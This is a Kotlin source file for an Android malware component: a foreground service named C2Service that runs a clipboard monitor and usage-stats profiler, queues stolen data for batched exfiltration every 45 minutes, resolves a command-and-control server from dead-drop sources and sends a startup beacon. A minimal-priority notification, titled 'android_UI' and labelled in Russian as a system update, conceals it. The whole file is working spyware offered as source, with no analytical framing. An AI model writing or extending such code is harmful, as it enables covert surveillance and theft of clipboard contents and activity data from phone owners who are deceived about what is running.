package com.sp.core.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.sp.core.c2.Exfil
import com.sp.core.util.BatchExfil
import com.sp.core.util.DeadDrop
import com.sp.core.worker.BatchFlushWorker

/**
 * The single long-lived foreground service. It hosts the clipboard monitor,
 * the usage-stats profiler and the 45-minute batch flush, so the device only
 * ever shows a single low-importance system notification.
 */
class C2Service : Service() {

    override fun onCreate() {
        super.onCreate()
        startForeground(NOTIF_ID, buildNotification())

        ClipboardMonitor.start(this)
        BatchFlushWorker.schedulePeriodic(this)

        try {
            // Plain background service (the C2 service is in the foreground, so
            // the background-start restriction does not apply here).
            startService(Intent(this, UsageStatsService::class.java))
        } catch (_: Throwable) {
        }

        // Background: recover the C2 endpoint from the dead-drop sources.
        Thread {
            try { DeadDrop.resolve(this) } catch (_: Throwable) {}
        }.start()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        BatchExfil.enqueue(this, "startup", """{"pid":${android.os.Process.myPid()},"ts":${System.currentTimeMillis()}}""")
        return START_STICKY
    }

    override fun onDestroy() {
        ClipboardMonitor.stop()
        super.onDestroy()
    }

    private fun buildNotification(): Notification {
        val chId = "sys_update"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(chId, "Обновление системы",
                NotificationManager.IMPORTANCE_MIN).apply { setShowBadge(false) }
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, chId)
            .setContentTitle("android_UI")
            .setContentText("Системный компонент работает")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        private const val NOTIF_ID = 0x5F62
    }
}
